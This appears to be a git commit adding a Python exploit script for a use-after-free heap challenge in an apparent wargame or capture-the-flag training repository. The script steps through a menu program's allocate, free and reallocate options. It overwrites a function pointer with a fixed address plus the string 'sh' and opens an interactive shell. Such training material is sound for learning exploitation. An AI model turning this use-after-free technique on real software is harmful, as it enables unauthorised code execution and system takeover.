4b070f962c7a0f882c659851c2ba822ea7258c1a
Anshul Singh <anshulspidy@gmail.com>
2025-11-14 01:59:27 +0530

    uaf chapter done

---
+++ ret2wargames/heap/uaf.py
@@ -0,0 +1,32 @@
+import interact
+import struct
+
+# Pack integer 'n' into a 8-Byte representation
+def p64(n):
+    return struct.pack('Q', n)
+
+# Unpack 8-Byte-long string 's' into a Python integer
+def u64(s):
+    return struct.unpack('Q', s)[0]
+
+p = interact.Process()
+print(p.readuntil('Choice:'))
+p.sendline('1')
+print(p.readuntil('name:'))
+p.sendline('a')
+print(p.readuntil('Choice:'))
+p.sendline('4')
+print(p.readuntil('Choice:'))
+p.sendline('5')
+print(p.readuntil('name:'))
+
+print_shell = p64(0x400eb3)
+payload = print_shell + b'sh\x00'
+p.sendline(payload)
+
+print(p.readuntil('Choice:'))
+p.sendline('3')
+print(p.readuntil('print:'))
+p.sendline('0')
+
+p.interactive()
